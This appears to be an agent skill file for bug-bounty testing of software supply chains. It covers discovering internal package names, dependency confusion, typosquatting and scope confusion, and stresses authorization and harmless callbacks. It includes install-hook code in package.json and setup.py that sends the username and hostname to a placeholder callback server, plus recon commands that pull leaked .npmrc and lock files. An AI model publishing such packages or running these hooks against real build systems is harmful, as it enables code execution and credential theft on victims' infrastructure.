---
name: supply_chain
description: Supply chain attacks — dependency confusion, typosquatting, internal package name discovery from source maps and error messages
---

# Supply Chain & Dependency Confusion

Supply chain attacks target the software build pipeline rather than the running application. Dependency confusion — registering internal package names on public registries — is the most accessible and highest-paying variant, with PayPal's $30K RCE as the landmark case. The attack surface includes npm, PyPI, RubyGems, NuGet, Maven, and any registry that supports both public and private packages.

## Attack Surface

**Package Registries**
- npm (Node.js) — most common target due to widespread private package usage
- PyPI (Python) — pip install with --extra-index-url creates confusion opportunities
- RubyGems (Ruby) — gem sources with private Gemfury/Artifactory mirrors
- NuGet (.NET) — nuget.config with multiple sources
- Maven/Gradle (Java) — repository priority in settings.xml/build.gradle
- Go modules — GOPROXY with private module paths

**Discovery Vectors**
- JavaScript source maps (reveal internal module names directly)
- Minified JS bundles (webpack/Vite chunk names, require() calls)
- Error messages and stack traces (expose internal package paths)
- package.json / requirements.txt / Gemfile leaks in public repos or exposed directories
- .npmrc / .pypirc / pip.conf files revealing private registry URLs
- GitHub/GitLab organizations (internal repo names often match package names)
- Job postings and documentation mentioning internal tooling names

**Build Pipeline Targets**
- CI/CD systems (GitHub Actions, GitLab CI, Jenkins) that install dependencies
- Docker builds with multi-stage dependency installation
- Developer workstations running `npm install` / `pip install`

## Key Vulnerabilities

### Dependency Confusion

When a project uses both a private registry and a public registry, the package manager may prefer the public version if it has a higher version number.

**npm Dependency Confusion:**
```bash
# 1. Discover internal package name (e.g., from source map)
# Found: @company/internal-auth in bundle

# 2. Check if the scoped package exists on public npm
npm view @company/internal-auth
# 404 = opportunity (but scoped packages are harder — the org must be unclaimed)

# 3. For unscoped packages (more common target):
npm view internal-auth-utils
# 404 = register it with a higher version number

# 4. Create malicious package
mkdir internal-auth-utils && cd internal-auth-utils
npm init -y
# Set version higher than the private one (e.g., 99.0.0)
```

**Malicious package.json with preinstall hook:**
```json
{
  "name": "internal-auth-utils",
  "version": "99.0.0",
  "description": "Security research - dependency confusion test",
  "scripts": {
    "preinstall": "curl https://your-oast-server.com/$(whoami)@$(hostname)"
  }
}
```

**PyPI Dependency Confusion:**
```bash
# Target uses: pip install --extra-index-url https://private.registry.com/simple/ internal-ml-utils

# Check public PyPI
pip install internal-ml-utils  # 404 = opportunity

# setup.py with install hook:
```

```python
# setup.py
from setuptools import setup
from setuptools.command.install import install
import os, socket

class CustomInstall(install):
    def run(self):
        # OAST callback (benign proof of execution)
        try:
            socket.getaddrinfo(f"{os.environ.get('USER','unknown')}.{socket.gethostname()}.your-oast-server.com", 80)
        except: pass
        install.run(self)

setup(
    name='internal-ml-utils',
    version='99.0.0',
    description='Security research — dependency confusion test',
    cmdclass={'install': CustomInstall},
)
```

### Internal Package Name Discovery

**From Source Maps:**
```bash
# Find source map references
curl -s https://target.com/static/js/main.js | grep -o '//# sourceMappingURL=.*'

# Download and extract module names
curl -s https://target.com/static/js/main.js.map | python3 -c "
import json, sys, re
data = json.load(sys.stdin)
sources = data.get('sources', [])
# Look for internal package references
for s in sources:
    if 'node_modules' in s:
        pkg = s.split('node_modules/')[-1].split('/')[0]
        if pkg.startswith('@'):
            pkg = '/'.join(s.split('node_modules/')[-1].split('/')[:2])
        print(pkg)
" | sort -u
```

**From JS Bundles (without source maps):**
```bash
# Webpack chunk names often reveal package names
curl -s https://target.com/static/js/main.js | grep -oE '"[a-z@][a-z0-9./_@-]+"' | sort -u

# Look for require() and import patterns
curl -s https://target.com/static/js/main.js | grep -oE 'require\("[^"]+"\)' | sort -u

# Webpack module IDs and comments
curl -s https://target.com/static/js/main.js | grep -oE '/\*\!?\s*[a-z@][a-z0-9/_@-]+\s*\*/' | sort -u
```

**From Error Messages:**
```bash
# Trigger errors that reveal internal paths
curl -s 'https://target.com/api/invalid' | grep -iE 'node_modules|require|import|ModuleNotFoundError'

# Check 500 error pages for stack traces
curl -s 'https://target.com/%00' | grep -iE 'at\s+\S+\s+\(.*node_modules'
```

**From Exposed Configuration:**
```bash
# Common leaked files
curl -s https://target.com/package.json
curl -s https://target.com/package-lock.json
curl -s https://target.com/.npmrc
curl -s https://target.com/yarn.lock
curl -s https://target.com/requirements.txt
curl -s https://target.com/Pipfile.lock
curl -s https://target.com/Gemfile.lock
curl -s https://target.com/composer.lock
```

### Typosquatting

Register packages with names similar to popular packages:
```
lodash    → lodahs, lodassh, l0dash
express   → expresss, expres, xpress
requests  → reqeusts, request, requets
```

### Namespace/Scope Confusion

```bash
# If target uses @company/package-name:
# Check if @company scope is claimed on npm
npm view @company/nonexistent 2>&1  # "Not found" vs "Invalid scope"

# If scope is unclaimed, register it and publish packages
npm login --scope=@company
```

## Bypass Techniques

**Registry Priority Manipulation**
- npm: without a `.npmrc` scope mapping, unscoped packages check public registry first
- pip: `--extra-index-url` checks BOTH registries; highest version wins
- Maven: repository order in settings.xml determines priority
- Force resolution: some lockfiles pin registry URLs; if the lockfile is not committed, confusion is possible

**Version Number Abuse**
- Use version `99.0.0` or `999.0.0` to guarantee priority over any internal version
- Some registries allow yanking/deleting versions — test if the private registry allows overwriting

**Install Hook Variants**
- npm: `preinstall`, `install`, `postinstall` scripts
- PyPI: `setup.py` install command, `pyproject.toml` build hooks
- RubyGems: `extconf.rb` native extension compilation
- Go: `go generate` directives (require explicit invocation)

## Tools

**confused (npm/PyPI dependency confusion scanner)**
```bash
# Scan package.json for confused dependencies
pip install confused
confused -p npm package-lock.json
confused -p pypi requirements.txt
```

**snync (npm scope confusion)**
```bash
# Check if scoped packages exist on public npm
npx snync check @company/package-name
```

**Source Map Explorer**
```bash
npx source-map-explorer main.js.map --json | jq '.bundles[].files | keys[]' | sort -u
```

**Manual Discovery Script**
```bash
#!/bin/bash
# Check if discovered package names are available on public npm
while read pkg; do
  status=$(npm view "$pkg" 2>&1)
  if echo "$status" | grep -q "404\|not found\|E404"; then
    echo "AVAILABLE: $pkg"
  else
    echo "EXISTS: $pkg ($(echo "$status" | grep 'latest:' | head -1))"
  fi
done < discovered_packages.txt
```

## Testing Methodology

1. **Discover internal package names** — Analyze source maps, JS bundles, error messages, exposed lock files, and GitHub repos
2. **Check public registry availability** — For each discovered name, check if it exists on npm/PyPI/RubyGems
3. **Understand the build pipeline** — Determine if the target uses private registries, scoped packages, lockfiles, and whether install hooks execute
4. **Coordinate with the target** — Dependency confusion is a gray area; always get explicit authorization before publishing packages
5. **Create a benign proof package** — Use OAST DNS callbacks (no destructive payloads); include a clear security research disclaimer
6. **Publish with high version** — Set version to 99.0.0 to ensure priority if the build system resolves to highest version
7. **Monitor for callbacks** — Wait for DNS/HTTP callbacks from CI/CD systems or developer machines
8. **Document the chain** — Show discovery vector -> package name -> registration -> code execution on target infrastructure

## Validation Requirements

1. **Prove code execution** — OAST callback (DNS or HTTP) from the target's build infrastructure showing the package was installed and hooks executed
2. **Show the discovery vector** — Document exactly how internal package names were found (source map, JS bundle, error message)
3. **Demonstrate the confusion** — Show that the public package was preferred over the private one due to version number or registry priority
4. **Benign payload only** — The proof package must only perform harmless callbacks (DNS lookup, HTTP ping); never execute destructive operations
5. **Include remediation** — Recommend scope registration, lockfile pinning, or registry-scoped .npmrc configuration

## False Positives

- Scoped packages (@org/name) where the scope is already registered by the target on the public registry
- Projects using lockfiles that pin exact versions and registry URLs (package-lock.json, yarn.lock with integrity hashes)
- Private registries configured as the ONLY source (no fallback to public)
- Build pipelines that disable install hooks (`npm install --ignore-scripts`)

## Impact

- **Remote code execution** — Install hooks execute arbitrary code on build servers and developer machines
- **CI/CD compromise** — Access to build secrets, deployment credentials, and source code
- **Supply chain propagation** — Malicious package becomes a transitive dependency for downstream consumers
- **Credential theft** — Build environments often contain cloud credentials, API tokens, and SSH keys
- PayPal paid $30K for dependency confusion achieving RCE on internal build infrastructure

## Pro Tips

1. Source maps are the single best discovery vector — always download and analyze them before anything else
2. Unscoped package names are much easier to exploit than scoped (@org/) packages because scopes must be registered
3. Always coordinate with the target's security team; publishing packages without authorization may violate terms of service
4. Use DNS OAST callbacks rather than HTTP — they are more reliable through firewalls and proxies
5. Check lockfiles: if package-lock.json or yarn.lock pins the registry URL, confusion is blocked
6. Internal package names often follow patterns: `company-*`, `internal-*`, `corp-*` — use these patterns to discover more
7. Monitor for the callback for at least 7 days — CI/CD pipelines may only run on merge to main
8. The highest-paying reports demonstrate end-to-end RCE: discovery of internal name -> package registration -> code execution on production infrastructure

## Summary

Dependency confusion exploits the trust boundary between private and public package registries. The attack requires only discovering an internal package name and registering it publicly with a higher version number. Source maps, JS bundles, and error messages are primary discovery vectors. Always use benign OAST callbacks, coordinate with the target, and document the full chain from discovery to code execution.
